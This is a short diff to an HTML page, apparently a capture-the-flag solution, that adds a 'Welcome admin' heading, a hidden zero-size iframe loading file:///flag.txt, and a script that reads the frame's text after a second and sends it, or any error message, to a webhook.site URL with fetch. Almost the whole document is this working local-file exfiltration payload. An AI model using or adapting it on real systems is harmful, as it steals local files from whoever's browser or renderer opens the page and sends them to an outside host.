@@ -1,4 +1,18 @@
 <!DOCTYPE html>
 <html>
-<head> hello</head>
+<body>
+<h1>Welcome admin 👁️👄👁️</h1>
+<iframe id="flagFrame" src="file:///flag.txt" style="width:0;height:0;border:0;"></iframe>
+
+<script>
+setTimeout(() => {
+  try {
+    let content = document.getElementById("flagFrame").contentDocument.body.innerText;
+    fetch("	https://webhook.site/8cd7bb5c-c1ed-444d-bea0-3a3da1e4840a" + encodeURIComponent(content));
+  } catch (e) {
+    fetch("	https://webhook.site/8cd7bb5c-c1ed-444d-bea0-3a3da1e4840a" + encodeURIComponent(e.toString()));
+  }
+}, 1000);
+</script>
+</body>
 </html>
